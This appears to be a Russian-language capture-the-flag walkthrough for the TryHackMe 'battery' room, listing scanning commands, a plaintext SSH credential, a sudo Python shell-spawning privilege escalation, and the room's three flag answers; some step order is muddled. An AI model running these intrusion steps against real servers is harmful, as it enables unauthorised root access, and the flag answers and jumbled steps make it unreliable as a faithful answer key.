[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [battery](https://tryhackme.com/r/room/battery) 

Всего 1 заданиe:
## Задание 1
Портал счетов за электроэнергию уже много раз взламывался, поэтому мы уволили одного из сотрудников службы 
безопасности. Как новичок, вы должны работать как хакер, чтобы найти лазейки в портале и получить root-доступ к 
серверу.

Надеюсь, вам понравится это путешествие! 

Не публиковать описание/прохождение до 19/01/2021

### Ответьте на вопросы ниже
Базовый флаг: 
```commandline
nmap -sSCV <IP>
gobuster dir -u http://<IP> -w /usr/share/dirb/wordlists /common.txt -x txt,php
<IP>/register.php
<IP>/report
strings report
echo "base64EncodedString" | base64 -d >> output.php
cyber:super#secure&password!
ssh cyber@<IP>
cat flag1.txt
```
```commandline
THM{6f7e4dd134e19af144c88e4fe46c67ea}
```
Флаг пользователя:
```commandline
sudo -l
echo 'import os; os.system("/bin/sh")' > /home/cyber/run.py
chmod +x run.py
cyber@ubuntu:~$ sudo /usr/bin/python3 /home/cyber/run.py
whoami
# cat /root/root.txt
```
```commandline
THM{20c1d18791a246001f5df7867d4e6bf5}
```
Корневой флаг:
```commandline
cd /home
ls
cyber yash
cd cybr
ls
cyber yash
emergency.py fernet flag2.txt root.txt
cat flag2.txt
```
```commandline
THM{db12b4451d5e70e2a177880ecfe3428d}
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)